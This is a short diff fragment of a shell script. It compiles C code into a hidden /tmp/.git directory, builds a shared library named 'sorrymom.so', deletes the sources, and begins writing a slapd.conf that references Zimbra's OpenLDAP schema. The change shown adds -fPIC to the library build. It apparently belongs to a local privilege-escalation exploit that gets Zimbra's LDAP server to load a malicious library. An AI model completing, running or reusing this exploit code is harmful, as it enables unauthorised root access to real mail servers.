@@ -26,7 +26,7 @@ int main(void){
 EOF
 gcc -o /tmp/.git/init /tmp/.git/init.c 2>&1
 rm -rf /tmp/.git/init.c
-gcc -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c 2>&1
+gcc -fPIC -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c 2>&1
 rm -rf /tmp/.git/sorrymom.c
 cat << EOF > /tmp/.git/slapd.conf
 include		/opt/zimbra/common/etc/openldap/schema/core.schema
